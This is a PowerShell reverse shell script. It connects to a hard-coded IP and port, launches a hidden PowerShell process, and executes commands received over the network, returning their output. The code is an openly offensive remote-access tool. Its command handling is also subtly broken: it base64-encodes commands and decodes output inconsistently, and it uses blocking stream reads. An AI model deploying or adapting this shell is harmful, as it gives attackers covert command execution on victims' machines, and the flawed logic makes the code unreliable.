# Set the target IP address and port
$targetIP = "192.168.1.100"
$targetPort = 8500

# Create a TCP client and connect to the target IP and port
$client = New-Object System.Net.Sockets.TCPClient($targetIP, $targetPort)

# Get the network stream from the client
$stream = $client.GetStream()

# Create a stream reader and writer
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# Start a new process and redirect its input, output, and error streams
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "cmd.exe"
$process.StartInfo.Arguments = "/c powershell -nop -w hidden -c `$input"
$process.StartInfo.RedirectStandardInput = $true
$process.StartInfo.RedirectStandardOutput = $true
$process.StartInfo.RedirectStandardError = $true
$process.StartInfo.UseShellExecute = $false
$process.Start() | Out-Null

# Redirect the input, output, and error streams to/from the network stream
$writer.AutoFlush = $true
$output = $process.StandardOutput.ReadToEnd()
$writer.WriteLine($output)

# Encode and execute commands from the network stream
while ($true) {
    $command = $reader.ReadLine()
    if ($command -eq "exit") {
        break
    }

    # Encode the command before sending
    $encodedCommand = [System.Text.Encoding]::UTF8.GetBytes($command)
    $encodedCommand = [System.Convert]::ToBase64String($encodedCommand)

    $process.StandardInput.WriteLine($encodedCommand)

    # Decode the output received
    $output = $process.StandardOutput.ReadToEnd()
    $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($output))
    $writer.WriteLine($decodedOutput)
}

# Close the network stream and the process
$stream.Close()
$process.Close()